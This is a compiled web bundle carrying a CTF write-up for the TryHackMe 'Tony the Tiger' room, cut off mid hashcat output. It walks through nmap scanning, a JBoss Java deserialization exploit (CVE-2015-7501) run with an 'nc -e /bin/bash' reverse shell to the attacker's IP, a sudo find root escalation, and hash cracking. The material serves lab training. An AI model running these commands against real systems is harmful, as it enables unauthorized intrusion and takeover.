"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[8959],{3905:(e,t,n)=>{n.d(t,{Zo:()=>c,kt:()=>m});var a=n(67294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function s(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function i(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var l=a.createContext({}),p=function(e){var t=a.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):s(s({},t),e)),n},c=function(e){var t=p(e.components);return a.createElement(l.Provider,{value:t},e.children)},h="mdxType",u={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},d=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,o=e.originalType,l=e.parentName,c=i(e,["components","mdxType","originalType","parentName"]),h=p(n),d=r,m=h["".concat(l,".").concat(d)]||h[d]||u[d]||o;return n?a.createElement(m,s(s({ref:t},c),{},{components:n})):a.createElement(m,s({ref:t},c))}));function m(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var o=n.length,s=new Array(o);s[0]=d;var i={};for(var l in t)hasOwnProperty.call(t,l)&&(i[l]=t[l]);i.originalType=e,i[h]="string"==typeof e?e:r,s[1]=i;for(var p=2;p<o;p++)s[p]=n[p];return a.createElement.apply(null,s)}return a.createElement.apply(null,n)}d.displayName="MDXCreateElement"},99165:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>s,default:()=>u,frontMatter:()=>o,metadata:()=>i,toc:()=>p});var a=n(87462),r=(n(67294),n(3905));const o={},s="Tony the Tiger",i={unversionedId:"Tryhackme/Tony the Tiger/Tony the Tiger",id:"Tryhackme/Tony the Tiger/Tony the Tiger",title:"Tony the Tiger",description:"Learn how to use a Java Serialisation attack in this boot-to-root",source:"@site/writeups/Tryhackme/Tony the Tiger/Tony the Tiger.md",sourceDirName:"Tryhackme/Tony the Tiger",slug:"/Tryhackme/Tony the Tiger/",permalink:"/writeups/Tryhackme/Tony the Tiger/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"tomghost",permalink:"/writeups/Tryhackme/Tomghost/"},next:{title:"ToolsRus",permalink:"/writeups/Tryhackme/ToolsRus/"}},l={},p=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Deploy!",id:"task-1-deploy",level:2},{value:"Task 2 Support Material",id:"task-2-support-material",level:2},{value:"Task 3 Reconnaissance",id:"task-3-reconnaissance",level:2},{value:"Task 4 Find Tony&#39;s Flag!",id:"task-4-find-tonys-flag",level:2},{value:"Task 5 Exploit!",id:"task-5-exploit",level:2},{value:"Task 6 Find User JBoss&#39; flag!",id:"task-6-find-user-jboss-flag",level:2},{value:"Task 7 Escalation!",id:"task-7-escalation",level:2},{value:"Task 8 Final Remarks, Credits &amp; Further Reading",id:"task-8-final-remarks-credits--further-reading",level:2}],c={toc:p},h="wrapper";function u(e){let{components:t,...n}=e;return(0,r.kt)(h,(0,a.Z)({},c,n,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"tony-the-tiger"},"Tony the Tiger"),(0,r.kt)("p",null,"Learn how to use a Java Serialisation attack in this boot-to-root"),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/tonythetiger"},"Tony the Tiger")),(0,r.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,r.kt)("li",{parentName:"ul"},"Web Poking"),(0,r.kt)("li",{parentName:"ul"},"CVE-2015-7501 - Jboss Java Deserialization"),(0,r.kt)("li",{parentName:"ul"},"Stored Passwords & Keys"),(0,r.kt)("li",{parentName:"ul"},"Misconfigured Binaries"),(0,r.kt)("li",{parentName:"ul"},"Brute Forcing (Hash)")),(0,r.kt)("hr",null),(0,r.kt)("h2",{id:"task-1-deploy"},"Task 1 Deploy!"),(0,r.kt)("p",null,"Firstly, ensure you are connected to the TryHackMe network via either the VPN Service or ",(0,r.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/kali"},"Kali Instance")," (subscribed members only). If you are not using the ",(0,r.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/kali"},"Kali Instance"),", you can ",(0,r.kt)("a",{parentName:"p",href:"https://tryhackme.com/access"},'verify connectivity to the THM network on the "access" page'),". Or if you are new, you can learn how to connect by ",(0,r.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/openvpn"},"visiting the OpenVPN Room"),"."),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"Please allow up towards five minutes for this instance to fully boot - even as a subscribed member.")," This is not a TryHackMe or AWS bottleneck, rather Java being Java and the web application taking time to fully initialise after boot."),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"Your Instance IP Address: MACHINE_IP")),(0,r.kt)("p",null,"Deploying now and proceeding with the material below should allow for plenty of time for the instance to fully boot."),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"I have deployed my Instance!")),(0,r.kt)("h2",{id:"task-2-support-material"},"Task 2 Support Material"),(0,r.kt)("p",null,'Whilst this is a CTF-style room, as the approach to ultimately "rooting" the box is new to TryHackMe, I will explain it a little and leave you to experiment with. There are flags laying around that aren\'t focused on the CVE, so I still encourage exploring this room. Explaining the whole-theory behind it is a little out of scope for this. However, I have provided some further reading material that may help with the room - or prove interesting!'),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},'What is "Serialisation"?')),(0,r.kt)("p",null,'Serialisation at an abstract is the process of converting data - specifically "Objects" in Object-Oriented Programming (OOP) languages such as Java into lower-level formatting known as "byte streams", where it can be stored for later use such as within files, databases, and/or traversed across a network. It is then later converted from this "byte stream" back into the higher-level "Object". This final conversion is known as "De-serialisation"'),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://media.geeksforgeeks.org/wp-content/uploads/serialization-5.jpg",alt:null})),(0,r.kt)("p",null,"(kindly taken from ",(0,r.kt)("a",{parentName:"p",href:"https://www.geeksforgeeks.org/classes-objects-java/"},"https://www.geeksforgeeks.org/classes-objects-java/"),")"),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},'So what is an "Object"?')),(0,r.kt)("p",null,'"Objects" in a programming-context can be compared to real-life examples. Simply, an "Object" is just that - a thing. "Objects" can contain various types of information such as states or features. To correlate to a real-world example...Let\'s take a lamp.'),(0,r.kt)("p",null,'A lamp is a great "Object". a lamp can be on or off, the lamp can have different types of bulbs - but ultimately it is still a lamp. What type of bulb it uses and whether or not the lamp is "on" or "off" in this instance is all stored within an "Object".'),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"How can we exploit this process?")),(0,r.kt)("p",null,'A "serialisation" attack is the injection and/or modification of data throughout the "byte stream" stage. When this data is later accessed by the application, malicious code can result in serious implications...ranging from DoS, data leaking or much more nefarious attacks like being "rooted"! Can you see where this is going...?'),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},'What is a great IRL example of an "Object"?')),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"lamp")),(0,r.kt)("ol",{start:2},(0,r.kt)("li",{parentName:"ol"},'What is the acronym of a possible type of attack resulting from a "serialisation" attack?')),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"DoS")),(0,r.kt)("ol",{start:3},(0,r.kt)("li",{parentName:"ol"},'What lower-level format does data within "Objects" get converted into?')),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"byte stream")),(0,r.kt)("h2",{id:"task-3-reconnaissance"},"Task 3 Reconnaissance"),(0,r.kt)("p",null,"Your first reaction to being presented with an instance should be information gathering."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Tony the Tiger$ sudo nmap -A -sS -sC -sV -O 10.10.179.44\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 15:04 CEST\nNmap scan report for 10.10.179.44\nHost is up (0.036s latency).\nNot shown: 989 closed ports\nPORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   1024 d6:97:8c:b9:74:d0:f3:9e:fe:f3:a5:ea:f8:a9:b5:7a (DSA)\n|   2048 33:a4:7b:91:38:58:50:30:89:2d:e4:57:bb:07:bb:2f (RSA)\n|   256 21:01:8b:37:f5:1e:2b:c5:57:f1:b0:42:b7:32:ab:ea (ECDSA)\n|_  256 f6:36:07:3c:3b:3d:71:30:c4:cd:2a:13:00:b5:25:ae (ED25519)\n80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))\n|_http-generator: Hugo 0.66.0\n|_http-server-header: Apache/2.4.7 (Ubuntu)\n|_http-title: Tony&#39;s Blog\n1090/tcp open  java-rmi    Java RMI\n|_rmi-dumpregistry: ERROR: Script execution failed (use -d to debug)\n1091/tcp open  java-rmi    Java RMI\n1098/tcp open  java-rmi    Java RMI\n1099/tcp open  java-object Java Object Serialization\n| fingerprint-strings:\n|   NULL:\n|     java.rmi.MarshalledObject|\n|     hash[\n|     locBytest\n|     objBytesq\n|     #http://thm-java-deserial.home:8083/q\n|     org.jnp.server.NamingServer_Stub\n|     java.rmi.server.RemoteStub\n|     java.rmi.server.RemoteObject\n|     xpwA\n|     UnicastRef2\n|_    thm-java-deserial.home\n4446/tcp open  java-object Java Object Serialization\n5500/tcp open  hotline?\n| fingerprint-strings:\n|   DNSStatusRequestTCP, RPCCheck:\n|     CRAM-MD5\n|     DIGEST-MD5\n|     NTLM\n|     GSSAPI\n|     thm-java-deserial\n|   DNSVersionBindReqTCP:\n|     GSSAPI\n|     CRAM-MD5\n|     DIGEST-MD5\n|     NTLM\n|     thm-java-deserial\n|   GenericLines, NULL:\n|     NTLM\n|     GSSAPI\n|     CRAM-MD5\n|     DIGEST-MD5\n|     thm-java-deserial\n|   GetRequest:\n|     NTLM\n|     GSSAPI\n|     DIGEST-MD5\n|     CRAM-MD5\n|     thm-java-deserial\n|   HTTPOptions:\n|     CRAM-MD5\n|     NTLM\n|     GSSAPI\n|     DIGEST-MD5\n|     thm-java-deserial\n|   Help:\n|     GSSAPI\n|     NTLM\n|     CRAM-MD5\n|     DIGEST-MD5\n|     thm-java-deserial\n|   Kerberos:\n|     NTLM\n|     CRAM-MD5\n|     DIGEST-MD5\n|     GSSAPI\n|     thm-java-deserial\n|   RTSPRequest:\n|     CRAM-MD5\n|     GSSAPI\n|     NTLM\n|     DIGEST-MD5\n|     thm-java-deserial\n|   SSLSessionReq:\n|     DIGEST-MD5\n|     CRAM-MD5\n|     GSSAPI\n|     NTLM\n|     thm-java-deserial\n|   TLSSessionReq:\n|     CRAM-MD5\n|     NTLM\n|     DIGEST-MD5\n|     GSSAPI\n|     thm-java-deserial\n|   TerminalServerCookie:\n|     DIGEST-MD5\n|     GSSAPI\n|     CRAM-MD5\n|     NTLM\n|_    thm-java-deserial\n8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)\n| ajp-methods:\n|   Supported methods: GET HEAD POST PUT DELETE TRACE OPTIONS\n|   Potentially risky methods: PUT DELETE TRACE\n|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html\n8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1\n| http-methods:\n|_  Potentially risky methods: PUT DELETE TRACE\n|_http-open-proxy: Proxy might be redirecting requests\n|_http-server-header: Apache-Coyote/1.1\n|_http-title: Welcome to JBoss AS\n8083/tcp open  http        JBoss service httpd\n|_http-title: Site doesn\'t have a title (text/html).\n3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :\n==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\nSF-Port1099-TCP:V=7.80%I=7%D=10/14%Time=5F86F773%P=x86_64-pc-linux-gnu%r(N\nSF:ULL,17B,"\\xac\\xed\\0\\x05sr\\0\\x19java\\.rmi\\.MarshalledObject\\|\\xbd\\x1e\\x9\nSF:7\\xedc\\xfc>\\x02\\0\\x03I\\0\\x04hash\\[\\0\\x08locBytest\\0\\x02\\[B\\[\\0\\x08objBy\nSF:tesq\\0~\\0\\x01xp\\xcb\\x07\\x93Hur\\0\\x02\\[B\\xac\\xf3\\x17\\xf8\\x06\\x08T\\xe0\\x0\nSF:2\\0\\0xp\\0\\0\\x004\\xac\\xed\\0\\x05t\\0#http://thm-java-deserial\\.home:8083/q\nSF:\\0~\\0\\0q\\0~\\0\\0uq\\0~\\0\\x03\\0\\0\\0\\xcd\\xac\\xed\\0\\x05sr\\0\\x20org\\.jnp\\.ser\nSF:ver\\.NamingServer_Stub\\0\\0\\0\\0\\0\\0\\0\\x02\\x02\\0\\0xr\\0\\x1ajava\\.rmi\\.serv\nSF:er\\.RemoteStub\\xe9\\xfe\\xdc\\xc9\\x8b\\xe1e\\x1a\\x02\\0\\0xr\\0\\x1cjava\\.rmi\\.s\nSF:erver\\.RemoteObject\\xd3a\\xb4\\x91\\x0ca3\\x1e\\x03\\0\\0xpwA\\0\\x0bUnicastRef2\nSF:\\0\\0\\x16thm-java-deserial\\.home\\0\\0\\x04J\\xf0\\x99\\x9e\\[\\x04}B\\x8c\\nAu\\)\\\nSF:0\\0\\x01u\'2\\x80w\\x80\\x02\\0x");\n==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\nSF-Port4446-TCP:V=7.80%I=7%D=10/14%Time=5F86F779%P=x86_64-pc-linux-gnu%r(N\nSF:ULL,4,"\\xac\\xed\\0\\x05");\n==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============\nSF-Port5500-TCP:V=7.80%I=7%D=10/14%Time=5F86F779%P=x86_64-pc-linux-gnu%r(N\nSF:ULL,4B,"\\0\\0\\0G\\0\\0\\x01\\0\\x03\\x04\\0\\0\\0\\x03\\x03\\x04\\0\\0\\0\\x02\\x01\\x04NT\nSF:LM\\x01\\x06GSSAPI\\x01\\x08CRAM-MD5\\x01\\nDIGEST-MD5\\x02\\x11thm-java-deseri\nSF:al")%r(GenericLines,4B,"\\0\\0\\0G\\0\\0\\x01\\0\\x03\\x04\\0\\0\\0\\x03\\x03\\x04\\0\\0\nSF:\\0\\x02\\x01\\x04NTLM\\x01\\x06GSSAPI\\x01\\x08CRAM-MD5\\x01\\nDIGEST-MD5\\x02\\x1\nSF:1thm-java-deserial")%r(GetRequest,4B,"\\0\\0\\0G\\0\\0\\x01\\0\\x03\\x04\\0\\0\\0\\x\nSF:03\\x03\\x04\\0\\0\\0\\x02\\x01\\x04NTLM\\x01\\x06GSSAPI\\x01\\nDIGEST-MD5\\x01\\x08C\nSF:RAM-MD5\\x02\\x11thm-java-deserial")%r(HTTPOptions,4B,"\\0\\0\\0G\\0\\0\\x01\\0\\\nSF:x03\\x04\\0\\0\\0\\x03\\x03\\x04\\0\\0\\0\\x02\\x01\\x08CRAM-MD5\\x01\\x04NTLM\\x01\\x06\nSF:GSSAPI\\x01\\nDIGEST-MD5\\x02\\x11thm-java-deserial")%r(RTSPRequest,4B,"\\0\\\nSF:0\\0G\\0\\0\\x01\\0\\x03\\x04\\0\\0\\0\\x03\\x03\\x04\\0\\0\\0\\x02\\x01\\x08CRAM-MD5\\x01\\\nSF:x06GSSAPI\\x01\\x04NTLM\\x01\\nDIGEST-MD5\\x02\\x11thm-java-deserial")%r(RPCC\nSF:heck,4B,"\\0\\0\\0G\\0\\0\\x01\\0\\x03\\x04\\0\\0\\0\\x03\\x03\\x04\\0\\0\\0\\x02\\x01\\x08C\nSF:RAM-MD5\\x01\\nDIGEST-MD5\\x01\\x04NTLM\\x01\\x06GSSAPI\\x02\\x11thm-java-deser\nSF:ial")%r(DNSVersionBindReqTCP,4B,"\\0\\0\\0G\\0\\0\\x01\\0\\x03\\x04\\0\\0\\0\\x03\\x0\nSF:3\\x04\\0\\0\\0\\x02\\x01\\x06GSSAPI\\x01\\x08CRAM-MD5\\x01\\nDIGEST-MD5\\x01\\x04NT\nSF:LM\\x02\\x11thm-java-deserial")%r(DNSStatusRequestTCP,4B,"\\0\\0\\0G\\0\\0\\x01\nSF:\\0\\x03\\x04\\0\\0\\0\\x03\\x03\\x04\\0\\0\\0\\x02\\x01\\x08CRAM-MD5\\x01\\nDIGEST-MD5\\\nSF:x01\\x04NTLM\\x01\\x06GSSAPI\\x02\\x11thm-java-deserial")%r(Help,4B,"\\0\\0\\0G\nSF:\\0\\0\\x01\\0\\x03\\x04\\0\\0\\0\\x03\\x03\\x04\\0\\0\\0\\x02\\x01\\x06GSSAPI\\x01\\x04NTL\nSF:M\\x01\\x08CRAM-MD5\\x01\\nDIGEST-MD5\\x02\\x11thm-java-deserial")%r(SSLSessi\nSF:onReq,4B,"\\0\\0\\0G\\0\\0\\x01\\0\\x03\\x04\\0\\0\\0\\x03\\x03\\x04\\0\\0\\0\\x02\\x01\\nDI\nSF:GEST-MD5\\x01\\x08CRAM-MD5\\x01\\x06GSSAPI\\x01\\x04NTLM\\x02\\x11thm-java-dese\nSF:rial")%r(TerminalServerCookie,4B,"\\0\\0\\0G\\0\\0\\x01\\0\\x03\\x04\\0\\0\\0\\x03\\x\nSF:03\\x04\\0\\0\\0\\x02\\x01\\nDIGEST-MD5\\x01\\x06GSSAPI\\x01\\x08CRAM-MD5\\x01\\x04N\nSF:TLM\\x02\\x11thm-java-deserial")%r(TLSSessionReq,4B,"\\0\\0\\0G\\0\\0\\x01\\0\\x0\nSF:3\\x04\\0\\0\\0\\x03\\x03\\x04\\0\\0\\0\\x02\\x01\\x08CRAM-MD5\\x01\\x04NTLM\\x01\\nDIGE\nSF:ST-MD5\\x01\\x06GSSAPI\\x02\\x11thm-java-deserial")%r(Kerberos,4B,"\\0\\0\\0G\\\nSF:0\\0\\x01\\0\\x03\\x04\\0\\0\\0\\x03\\x03\\x04\\0\\0\\0\\x02\\x01\\x04NTLM\\x01\\x08CRAM-M\nSF:D5\\x01\\nDIGEST-MD5\\x01\\x06GSSAPI\\x02\\x11thm-java-deserial");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/14%OT=22%CT=1%CU=31900%PV=Y%DS=2%DC=T%G=Y%TM=5F86F7\nOS:92%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OP\nOS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST\nOS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC\nOS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 587/tcp)\nHOP RTT      ADDRESS\n1   34.63 ms 10.8.0.1\n2   35.54 ms 10.10.179.44\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 35.33 seconds\n')),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},'What service is running on port "8080"')),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1\n| http-methods:\n|_  Potentially risky methods: PUT DELETE TRACE\n|_http-open-proxy: Proxy might be redirecting requests\n|_http-server-header: Apache-Coyote/1.1\n|_http-title: Welcome to JBoss AS\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"Apache Tomcat/Coyote JSP engine 1.1")),(0,r.kt)("ol",{start:2},(0,r.kt)("li",{parentName:"ol"},'What is the name of the front-end application running on "8080"?')),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"JBoss")),(0,r.kt)("h2",{id:"task-4-find-tonys-flag"},"Task 4 Find Tony's Flag!"),(0,r.kt)("p",null,"Tony has started a totally unbiased blog about taste-testing various cereals! He'd love for you to have a read..."),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},'This flag will have the formatting of "THM{}"')),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"http://10.10.179.44/posts/frosted-flakes/"},"http://10.10.179.44/posts/frosted-flakes/")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Tony the Tiger$ curl -s http://10.10.179.44/posts/frosted-flakes/ | grep img\n  <link rel=\'icon\' type=\'image/x-icon\' href="https://i.imgur.com/ATbbYpN.jpg" />\n<p><img src="https://i.imgur.com/be2sOV9.jpg" alt="FrostedFlakes"></p>\n    <img alt="Author Avatar" src="https://i.imgur.com/ATbbYpN.jpg" />\nkali@kali:~/CTFs/tryhackme/Tony the Tiger$ wget https://i.imgur.com/be2sOV9.jpg\n--2020-10-14 15:10:23--  https://i.imgur.com/be2sOV9.jpg\nResolving i.imgur.com (i.imgur.com)... 151.101.112.193\nConnecting to i.imgur.com (i.imgur.com)|151.101.112.193|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 84746 (83K) [image/jpeg]\nSaving to: \u2018be2sOV9.jpg\u2019\n\nbe2sOV9.jpg                                      100%[=======================================================================================================>]  82.76K   286KB/s    in 0.3s\n\n2020-10-14 15:10:24 (286 KB/s) - \u2018be2sOV9.jpg\u2019 saved [84746/84746]\n\nkali@kali:~/CTFs/tryhackme/Tony the Tiger$ strings be2sOV9.jpg | grep THM\n}THM{Tony_Sure_Loves_Frosted_Flakes}\n\'THM{Tony_Sure_Loves_Frosted_Flakes}(dQ\n')),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"THM{Tony_Sure_Loves_Frosted_Flakes}")),(0,r.kt)("h2",{id:"task-5-exploit"},"Task 5 Exploit!"),(0,r.kt)("p",null,'Download the attached resources (48.3MB~) to this task by pressing the "Download" icon within this task.'),(0,r.kt)("p",null,"FILE NAME: ",(0,r.kt)("strong",{parentName:"p"},"jboss.zip (48.3MB~)")," MD5 CHECKSUM: ",(0,r.kt)("strong",{parentName:"p"},"ED2B009552080A4E0615451DB0769F8B")),(0,r.kt)("p",null,"The attached resources are compiled together to ensure that everyone is able to complete the exploit, ",(0,r.kt)("strong",{parentName:"p"},"these resources are not my own creations")," (although have been very slightly modified for compatibility) ",(0,r.kt)("strong",{parentName:"p"},'and all credit is retained to the respective authors listed within "credits.txt"')," as well as the end of the room."),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/a1yznLT.png",alt:null})),(0,r.kt)("p",null,"It is your task to research the vulnerability ",(0,r.kt)("a",{parentName:"p",href:"https://www.rapid7.com/db/vulnerabilities/http-jboss-cve-2015-7501"},"CVE-2015-7501")," and to use it to obtain a shell to the instance using the payload & exploit provided. There may be a few ways of doing it...If you are struggling, I",(0,r.kt)("a",{parentName:"p",href:"https://blog.cmnatic.co.uk/posts/exploiting-java-deserialization-windows-demo/"}," have written an example of how this vulnerability is used to launch an application on Windows"),"."),(0,r.kt)("p",null,"There's also a couple of ways of exploiting this service - I really encourage you to investigate into them yourself!"),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"I have obtained a shell.")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Tony the Tiger/jboss$ python exploit.py 10.10.179.44:8080 "nc -e /bin/bash 10.8.106.222 9001"\n[*] Target IP: 10.10.179.44\n[*] Target PORT: 8080\nPicked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true\n[+] Command executed successfully\n')),(0,r.kt)("h2",{id:"task-6-find-user-jboss-flag"},"Task 6 Find User JBoss' flag!"),(0,r.kt)("p",null,"Knowledge of the Linux (specifically Ubuntu/Debian)'s file system structure & permissions is expected. If you are struggling, I strongly advise checking out the fantastic ",(0,r.kt)("a",{parentName:"p",href:"http://tryhackme.com/room/zthlinux"},"TryHackMe ZTHLinux Room")," by ",(0,r.kt)("a",{parentName:"p",href:"http://tryhackme.com/p/lollava"},"lollava"),"."),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},'This flag has the formatting of "THM{}"')),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'pwd\n/\ncd /home\ngrep -R "THM{" * 2>/dev/null\njboss/.jboss.txt:THM{50c10ad46b5793704601ecdad865eb06}\njboss/.bash_history:echo "THM{50c10ad46b5793704601ecdad865eb06}" > jboss.txt\n')),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"THM{50c10ad46b5793704601ecdad865eb06}")),(0,r.kt)("h2",{id:"task-7-escalation"},"Task 7 Escalation!"),(0,r.kt)("p",null,"Normal boot-to-root expectations apply here! It is located in /root/root.txt. Get cracking :)"),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},'The final flag does not have the formatting of "THM{}"')),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"cd jboss\npwd\n/home/jboss\nls\nnote\ncat note\nHey JBoss!\n\nFollowing your email, I have tried to replicate the issues you were having with the system.\n\nHowever, I don't know what commands you executed - is there any file where this history is stored that I can access?\n\nOh! I almost forgot... I have reset your password as requested (make sure not to tell it to anyone!)\n\nPassword: likeaboss\n\nKind Regards,\nCMNatic\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Tony the Tiger/jboss$ ssh jboss@10.10.179.44\nThe authenticity of host '10.10.179.44 (10.10.179.44)' can't be established.\nECDSA key fingerprint is SHA256:4QLWqzX1KRYhF9PwQBGqNaH5mOk6uuV8QwfHDP7Wgqk.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.179.44' (ECDSA) to the list of known hosts.\njboss@10.10.179.44's password:\nWelcome to Ubuntu 14.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)\njboss@thm-java-deserial:~$ pwd\n/home/jboss\njboss@thm-java-deserial:~$ ls\nnote\njboss@thm-java-deserial:~$ sudo -l\nMatching Defaults entries for jboss on thm-java-deserial:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser jboss may run the following commands on thm-java-deserial:\n    (ALL) NOPASSWD: /usr/bin/find\njboss@thm-java-deserial:~$ sudo find . -exec /bin/bash \\; -quit\nroot@thm-java-deserial:~# cd /root\nroot@thm-java-deserial:/root# ls\nroot.txt\nroot@thm-java-deserial:/root# cat root.txt\nQkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==\nroot@thm-java-deserial:/root# cat root.txt | base64 -d\nBC77AC072EE30E3760806864E234C7CF\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Tony the Tiger$ hashcat -a 0 -m 0 BC77AC072EE30E3760806864E234C7CF /usr/share/wordlists/rockyou.txt --force\nhashcat (v5.1.0) starting...\n\nOpenCL Platform #1: The pocl project\n====================================\n* Device #1: pthread-Intel(R) Xeon(R) CPU E5-1650 v3 @ 3.50GHz, 512/1493 MB allocatable, 2MCU\n\nHashes: 1 digests; 1 unique digests, 1 unique salts\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates\nRules: 1\n\nApplicable optimizers:\n* Zero-Byte\n* Early-Skip\n* Not-Salted\n* Not-Iterated\n* Single-Hash\n* Single-Salt\n* Raw-Hash\n\nMinimum password length supported by kernel: 0\nMaximum password length supported by kernel: 256\n\nATTENTION! 